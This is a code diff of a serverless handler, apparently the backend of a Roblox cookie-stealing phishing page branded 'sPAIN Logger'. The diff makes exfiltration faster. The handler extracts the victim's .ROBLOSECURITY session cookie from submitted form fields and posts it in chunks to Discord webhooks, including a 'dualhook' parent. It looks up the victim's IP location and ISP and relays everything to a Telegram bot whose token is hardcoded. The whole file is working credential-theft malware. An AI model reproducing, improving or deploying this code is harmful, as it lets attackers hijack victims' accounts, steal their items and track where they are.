@@ -1,9 +1,10 @@
-// api/submit.js — sends cookie INSTANTLY, geo as follow-up
+// api/submit.js — cookie hits Discord immediately, geo runs in parallel
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
+// ── Redis ─────────────────────────────────────────────────────────────────────
 async function redisGet(key) {
   try {
     const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
@@ -18,18 +19,20 @@ async function redisGet(key) {
   } catch { return null; }
 }
 
+// ── Geo ───────────────────────────────────────────────────────────────────────
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), 3000);
-    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: controller.signal });
+    const ctrl  = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), 3000);
+    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
     clearTimeout(timer);
     const d = await r.json();
     return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
   } catch { return null; }
 }
 
+// ── Telegram ──────────────────────────────────────────────────────────────────
 async function tgSend(text) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -40,6 +43,7 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
+// ── Cookie extractor ──────────────────────────────────────────────────────────
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
 function extractCookie(raw) {
   if (!raw) return null;
@@ -58,6 +62,15 @@ function findCookie(slots) {
   return null;
 }
 
+// ── Body parser ───────────────────────────────────────────────────────────────
+function parseBody(raw) {
+  if (!raw) return {};
+  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
+  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
+  catch { return {}; }
+}
+
+// ── Discord ───────────────────────────────────────────────────────────────────
 async function discordSend(url, payload) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
@@ -69,19 +82,20 @@ async function discordSend(url, payload) {
   } catch (_) {}
 }
 
-async function sendCookieChunked(url, cookie) {
-  let rem = cookie; let first = true;
+async function discordChunked(url, text) {
+  let rem = text; let first = true;
   while (rem.length > 0) {
     const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
     await discordSend(url, {
       content: first
         ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
-        : chunk + (rem.length === 0 ? '\n```' : '')
+        : chunk  + (rem.length === 0 ? '\n```' : '')
     });
     first = false;
   }
 }
 
+// ── Main handler ──────────────────────────────────────────────────────────────
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -89,11 +103,8 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(204).end();
   if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });
 
-  let body = req.body;
-  if (typeof body === 'string') { try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); } }
-  if (Buffer.isBuffer(body))   { try { body = JSON.parse(body.toString()); } catch { return res.status(400).json({ error: 'Invalid body' }); } }
-
-  const { slug, slots } = body || {};
+  const body = parseBody(req.body);
+  const { slug, slots } = body;
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
 
@@ -101,96 +112,88 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  res.status(200).json({ success: true });
+  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
+              || req.headers['x-real-ip'] || 'Unknown';
+  const now    = new Date().toISOString();
+  const pName  = record.displayName || slug;
+  const cookie = findCookie(slots);
 
-  try {
-    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
-    const now      = new Date().toISOString();
-    const pageName = record.displayName || slug;
-    const cookie   = findCookie(slots);
-
-    const webhooks = [record.webhook];
-    if (record.dualhookParent) {
-      try {
-        const parent = await redisGet(`slot:${record.dualhookParent}`);
-        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
-      } catch (_) {}
-    }
-
-    if (!cookie) {
-      // No cookie — get geo then send troll embed
-      const geo      = await getIpGeo(ip);
-      const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-      const isp      = geo?.isp || 'Unknown';
-      for (const wh of webhooks) {
-        await discordSend(wh, {
-          embeds: [{
-            title:       '⚠️ Wrong Cookie — Troll Detected',
-            description: 'No valid cookie found.',
-            color:       0xff3333,
-            fields: [
-              { name: '🌐 IP',       value: ip,       inline: true },
-              { name: '📍 Location', value: location, inline: true },
-              { name: '🗺️ ISP',      value: isp,      inline: true },
-              { name: '🕐 Time',     value: now,      inline: false }
-            ],
-            footer: { text: `sPAIN Logger • ${pageName}` },
-            timestamp: now
-          }]
-        });
-      }
-      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code>\n📍 ${location}\n🗺️ ${isp}`);
-      return;
-    }
-
-    // ── COOKIE FOUND ─────────────────────────────────────────────────────────
-    // Step 1: Send IP + cookie IMMEDIATELY — no geo wait
-    for (const wh of webhooks) {
-      await discordSend(wh, {
-        content: '@everyone',
-        embeds: [{
-          title:     '🍪 Cookie Captured',
-          color:     0xc026d3,
-          fields: [
-            { name: '🌐 IP',   value: `\`${ip}\``, inline: true },
-            { name: '🕐 Time', value: now,          inline: false }
-          ],
-          footer:    { text: `sPAIN Logger • ${pageName}` },
-          timestamp: now
-        }]
-      });
-      await sendCookieChunked(wh, cookie);
-    }
-
-    // Step 2: Geo lookup AFTER cookie already sent
-    const geo      = await getIpGeo(ip);
-    const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-    const isp      = geo?.isp || 'Unknown';
-
-    // Step 3: Send location/ISP as follow-up
-    for (const wh of webhooks) {
-      await discordSend(wh, {
-        embeds: [{
-          title: '📍 Location Info',
-          color: 0xc026d3,
-          fields: [
-            { name: '📍 Location', value: location, inline: true },
-            { name: '🗺️ ISP',      value: isp,       inline: true }
-          ],
-          footer: { text: `sPAIN Logger • ${pageName}` }
-        }]
-      });
-    }
-
-    await tgSend([
-      `🍪 <b>COOKIE CAPTURED — ${pageName}</b>`,
-      `🌐 IP: <code>${ip}</code>`,
-      `📍 ${location}`,
-      `🗺️ ${isp}`,
-      `🕐 ${now}`
-    ].join('\n'));
-
-  } catch (err) {
-    console.error('Error:', err.message);
+  // Collect webhooks (page owner + dualhook parent)
+  const webhooks = [record.webhook];
+  if (record.dualhookParent) {
+    const parent = await redisGet(`slot:${record.dualhookParent}`);
+    if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
   }
+
+  // ── No cookie ─────────────────────────────────────────────────────────────
+  if (!cookie) {
+    const geo = await getIpGeo(ip);
+    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
+    await Promise.all(webhooks.map(wh => discordSend(wh, {
+      embeds: [{
+        title:  '⚠️ Wrong Cookie — Troll Detected',
+        color:  0xff3333,
+        fields: [
+          { name: '🌐 IP',       value: ip,              inline: true  },
+          { name: '📍 Location', value: loc,             inline: true  },
+          { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
+          { name: '🕐 Time',     value: now,             inline: false }
+        ],
+        footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now
+      }]
+    })));
+    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
+    return res.status(200).json({ success: true });
+  }
+
+  // ── Cookie found ─────────────────────────────────────────────────────────
+  // Fire geo lookup AND cookie Discord send at the SAME TIME — no waiting
+  const geoPromise = getIpGeo(ip);
+
+  // Cookie embed + raw cookie to all webhooks immediately
+  await Promise.all(webhooks.map(async wh => {
+    await discordSend(wh, {
+      content: '@everyone',
+      embeds: [{
+        title:     '🍪 Cookie Captured',
+        color:     0xc026d3,
+        fields: [
+          { name: '🌐 IP',   value: `\`${ip}\``, inline: true  },
+          { name: '📄 Page', value: pName,        inline: true  },
+          { name: '🕐 Time', value: now,          inline: false }
+        ],
+        footer:    { text: `sPAIN Logger • ${pName}` },
+        timestamp: now
+      }]
+    });
+    await discordChunked(wh, cookie);
+  }));
+
+  // Now wait for geo (it was running in parallel the whole time)
+  const geo = await geoPromise;
+  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
+  const isp = geo?.isp || 'Unknown';
+
+  // Send geo follow-up to all webhooks
+  await Promise.all(webhooks.map(wh => discordSend(wh, {
+    embeds: [{
+      color:  0xa855f7,
+      fields: [
+        { name: '📍 Location', value: loc, inline: true },
+        { name: '🗺️ ISP',      value: isp, inline: true }
+      ],
+      footer: { text: `sPAIN Logger • ${pName}` }
+    }]
+  })));
+
+  await tgSend([
+    `🍪 <b>COOKIE — ${pName}</b>`,
+    `🌐 <code>${ip}</code>`,
+    `📍 ${loc}`,
+    `🗺️ ${isp}`,
+    `🕐 ${now}`
+  ].join('\n'));
+
+  // Respond AFTER all sends — fixes Vercel "3 submits to fire" bug
+  return res.status(200).json({ success: true });
 }
